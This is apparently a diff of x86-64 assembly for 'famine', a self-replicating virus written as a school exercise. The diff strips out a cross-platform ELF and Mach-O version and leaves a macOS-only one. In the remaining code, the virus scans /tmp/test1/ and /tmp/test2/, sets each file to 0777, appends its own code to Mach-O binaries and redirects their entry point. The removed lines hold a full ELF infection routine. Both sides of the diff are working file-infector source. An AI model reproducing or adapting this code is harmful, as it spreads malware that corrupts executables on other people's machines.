@@ -1,50 +1,25 @@
-%include "famine2.inc"
+; famine dawrin - size 694 bytes
 
-%define translate_syscall call _translate_syscall
-
-%define BUF_SIZE    1024
-%define LOCAL_VARS  1024
+%include "famine.inc"
 
 bits 64
 default rel
 global _start
 section .text
 
-strlen:         xor         rax, rax
-.loop:          cmp         byte [rax + rdi], 0
-                jz          .done
-                inc         rax
-                jmp         .loop
-.done:          ret
-
-
-puts:           call        strlen
-                mov         rdx, rax
-                mov         rsi, rdi
-                mov         rdi, 1
-
-%ifidn __OUTPUT_FORMAT__, elf64
-                mov         rax, __NR_write
-%elifidn __OUTPUT_FORMAT__, macho64
+_host:
+                mov         rdx, 13
+                mov         rax, 1
+                mov         rdi, rax
+                lea         rsi, [rel hello]
+               
                 mov         rax, Darwin__NR_write
-                or          rax, 0x02000000
-%endif
                 syscall
-                ret
-
-_host:          lea         rdi, [rel hello]
-                call        puts
 
                 xor         rdi, rdi
-%ifidn __OUTPUT_FORMAT__, elf64
-                mov         rax, __NR_exit
-%elifidn __OUTPUT_FORMAT__, macho64
                 mov         rax, Darwin__NR_exit
-                or          rax, 0x02000000
-%endif
                 syscall
 hello           db          "hello world",33,10,0
-                times 128 - $ + strlen db 0x90
 
 _start:
                 push        rdi
@@ -53,8 +28,6 @@ _start:
                 push        rdx
 
                 lea         rax, [rel _start]
-                xor         r15, r15
-                mov         r15b, byte [rax + (_platform - _start)]
                 mov         rdx, [rel pie_address]
                 sub         rax, rdx
                 add         rax, [rel entry]
@@ -64,12 +37,9 @@ _start:
 .opendir:
                 mov         r14, rdi
                 mov         rsi, O_RDONLY | O_DIRECTORY
-                mov         rax, __NR_open
-                translate_syscall
+                mov         rax, Darwin__NR_open
+                syscall
                 jc          .nextdir                            ;XXX expecting carry flag if syscall fails
-                test        eax, eax
-                jl          .nextdir
-                
 
                 mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
 
@@ -77,8 +47,8 @@ _start:
                 mov         rdx, BUF_SIZE
                 lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                 mov         rdi, [rsp-0x30]                     ;directory fd
-                mov         rax, __NR_getdents
-                translate_syscall
+                mov         rax, Darwin__NR_getdents
+                syscall
                 test        rax, rax
                 jle         .closedir
 
@@ -90,19 +60,9 @@ _start:
 
                 xor         edx, edx
 
-                test        r15b, r15b
-                jz          .linux_dirent
                 mov         dx, word [rdi + 4]                  ; macos d_reclen
                 mov         al, byte [rdi + 6]                  ; macos d_type
                 add         rdi, 8                              ; macos d_name
-                jmp         .increment_idx
-.linux_dirent:
-                mov         dx, word [rdi + 0x10]               ; linux d_reclen
-                dec         edx
-                mov         al, byte [rdi + rdx]                ; linux d_type
-                inc         edx
-                add         rdi, 18                             ; linux d_name
-.increment_idx:
                 add         r13, rdx
 
                 cmp         al, DT_REG
@@ -115,8 +75,8 @@ _start:
                 jmp         .readdir
 
 .closedir:      mov         rdi, [rsp-0x30]
-                mov         rax, __NR_close
-                translate_syscall
+                mov         rax, Darwin__NR_close
+                syscall
 .nextdir:
                 xor         ecx, ecx
                 mul         ecx
@@ -152,23 +112,21 @@ process:                                                        ; expecting file
 
                 push        rdi
                 mov         rsi, 0o777
-                mov         rax, __NR_chmod                     ; try to set permissions
-                translate_syscall
+                mov         rax, Darwin__NR_chmod                     ; try to set permissions
+                syscall
                 pop         rdi
 
                 mov         rsi, O_RDWR
-                mov         rax, __NR_open
-                translate_syscall
+                mov         rax, Darwin__NR_open
+                syscall
                 jc          .return                             ; XXX expecting carry flag if open() fails
-                test        eax, eax
-                jl          .return
 
                 mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd
 
                 lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
                 mov         rdi, [rsp-0x48]
-                mov         rax, __NR_fstat
-                translate_syscall
+                mov         rax, Darwin__NR_fstat
+                syscall
                 cmp         rax, 0
                 jnz         .close
 
@@ -187,61 +145,34 @@ process:                                                        ; expecting file
                 mov         rdx, PROT_READ | PROT_WRITE
                 mov         rsi, rax
                 xor         rdi, rdi
-                mov         rax, __NR_mmap
-                translate_syscall
+                mov         rax, Darwin__NR_mmap
+                syscall
                 cmp         rax, -4095
                 jae         .close
 
                 mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
                 mov         rdi, rax
 
-                call        is_valid_elf64
-                test        al, al
-                jnz         .insert_elf64
-
                 call        is_valid_macho64
                 test        al, al
                 jz          .unmap
 
                 call        insert_macho64
-                jmp         .unmap
-
-.insert_elf64:  call        insert_elf64
 
 .unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
                 mov         rdi, [rsp-0x58]                     ; infect_mem
-                mov         rax, __NR_munmap
-                translate_syscall
+                mov         rax, Darwin__NR_munmap
+                syscall
 
 .close:         mov         rdi, [rsp-0x48]
-                mov         rax, __NR_close
-                translate_syscall
+                mov         rax, Darwin__NR_close
+                syscall
 .return:        ret
-
-is_valid_elf64:                                                 ; expecing data in rdi
-                xor         rax, rax                            ; result in rax; 1 = valid
-                cmp         qword [rdi + 8], rax
-                jnz         .return
-                mov         rdx, ELF_SYSV
-                cmp         qword [rdi], rdx
-                jz          .continue
-                mov         rdx, ELF_GNU
-                cmp         qword [rdi], rdx
-                jnz         .return
-.continue:      mov         rdx, ELF64_ET_DYN
-                cmp         qword [rdi + 0x10], rdx
-                jz          .ok
-                mov         rdx, ELF64_ET_EXEC
-                cmp         qword [rdi + 0x10], rdx
-                jnz         .return
-.ok:            inc         rax
-.return:        ret
-
 
 is_valid_macho64:
                 push        rdi
                 call        .mach_header_64
-                db 0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1, 3, 0, 0, 0x80, 2, 0, 0, 0
+                db          0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1, 3, 0, 0, 0x80, 2, 0, 0, 0
 .mach_header_64:pop         rsi
                 xor         ecx, ecx
                 mul         rcx
@@ -251,78 +182,6 @@ is_valid_macho64:
                 inc         al
 .return:        pop         rdi
                 ret
-
-insert_elf64:                                                   ; expecting data in rdi
-                push        r13
-                push        r14
-                push        r15
-
-                mov         r15, rdi
-
-                mov         rdx, qword [r15 + 0x18]             ; entry point
-                mov         rax, qword [rdi + 0x20]             ; e_phoff
-                movzx       rcx, word [rdi + 0x38]              ; e_phnum                
-                add         rdi, rax                            ; rdi = *Elf64_Phdr
-.segment:       cmp         rcx, 0
-                jle         .return
-                mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
-                cmp         rax, qword [rdi]
-                jnz         .next
-                mov         rax, qword [rdi + 0x10]             ; p_vaddr
-                cmp         rdx, rax
-                jb          .next
-                add         rax, qword [rdi + 0x28]             ; p_vaddr + p_memsz
-                mov         r13, rax                            ; new entry point
-                cmp         rdx, rax
-                jae         .next
-
-                mov         rax, qword [rdi + 0x08]             ; rax = p_offset
-                add         rax, qword [rdi + 0x20]             ; rax += p_filesz
-
-                mov         r14, rdi                            ; code segment Elf64_Phdr*
-
-                lea         rdi, [r15 + rax]                    ; data + p_offset + p_filesz
-                mov         rsi, rdi                            ; save: end of segment
-                xor         al, al
-                mov         rcx, _finish - _start
-                repz        scasb
-                test        rcx, rcx
-                ja          .return                             ; not enough room
-
-                lea         rdi, [rel _start]
-                xchg        rdi, rsi
-                mov         rax, [rel signature]
-                cmp         rax, qword [rdi - (_finish - signature)]
-                jz          .return                             ; already infected
-                mov         rcx, _finish - _start
-                repnz       movsb
-
-                ;r15 = beginning of file
-                ;r14 = code segment header
-                ;r13 = new entry point
-
-                mov         rax, qword [r15 + 0x18]             ; entry point
-                mov         qword [rdi - 8], rax                ; _finish - 8 = entry
-                mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
-                mov         byte [rdi - 17], 0
-                mov         qword [r15 + 0x18], r13             ; fix entry point
-                mov         rax, _finish - _start
-                add         qword [r14 + 0x20], rax             ; increase p_filesz
-                add         qword [r14 + 0x28], rax             ; increase p_memsz
-                jmp         .return
-
-.next:          add         rdi, 0x38                           ; sizeof(Elf64_Phdr)
-                dec         rcx
-                jmp         .segment
-
-.return:
-                pop         r15
-                pop         r14
-                pop         r13
-                ret
-
-%define         LC_SEGMENT_64       0x19
-%define         LC_MAIN             0x80000028
 
 insert_macho64:                                                 ; expecting data in rdi
                 push        r12
@@ -373,7 +232,7 @@ insert_macho64:                                                 ; expecting data
                 lea         rsi, [rel _start]
                 rep         movsb
 
-                mov         rcx, qword [r13]                ; get entry point
+                mov         rcx, qword [r13]                    ; get entry point
                 mov         qword [r13], rax
 
                 mov         qword [rdi - 8], rcx                ; store entry point
@@ -389,38 +248,9 @@ insert_macho64:                                                 ; expecting data
                 pop         r12
                 ret
 
+slash_tmp       db          "/tmp/test1/",0,"/tmp/test2/",0,0
+signature       db          "famine! darwin @42siliconvalley",0
 
-linux_syscalls          db 0x02, 0x03, 0x05, 0x09, 0x0b, 0x4e, 0x5a
-darwin_syscalls         db 0x05, 0x06, 0xbd, 0xc5, 0x49, 0xc4, 0x0f
-%define num_syscalls    7
-
-_translate_syscall:                                             ; expecting r15 == 0 on linux
-                test        r15, r15                            ; anything else on macos
-                jz          .ready
-                push        rdi
-                push        rcx
-                lea         rdi, [rel linux_syscalls]
-                mov         rcx, num_syscalls
-                repne       scasb
-                add         rdi, (num_syscalls - 1)
-                mov         al, byte [rdi]
-                or          eax, 0x02000000;
-                pop         rcx
-                pop         rdi
-.ready:         syscall
-                ret
-
-
-slash_tmp   db "/tmp/test1/",0,"/tmp/test2/",0,0
-signature   db "famine v0.1 @42siliconvalley",0
-
-_platform:
-%ifidn __OUTPUT_FORMAT__, elf64
-            db 0
-%elifidn __OUTPUT_FORMAT__, macho64
-            db 1
-%endif
-
-pie_address dq (_start - strlen)
-entry       dq (_host - strlen)
+pie_address     dq          (_start - _host)
+entry           dq          0
 _finish:
